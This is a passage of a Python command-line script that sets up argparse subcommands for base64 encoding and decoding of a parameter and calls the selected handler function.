encode_parser.add_argument('parameter', action='store', type=str, help='Parameter to encode')

decode_parser = subparsers.add_parser('p', help='Decode base64 parameter')
decode_parser.set_defaults(func=mode_b64d)
decode_parser.add_argument('parameter', action='store', type=str, help='Parameter to decode')

args = p.parse_args()

if len(sys.argv) > 2:
    args.func();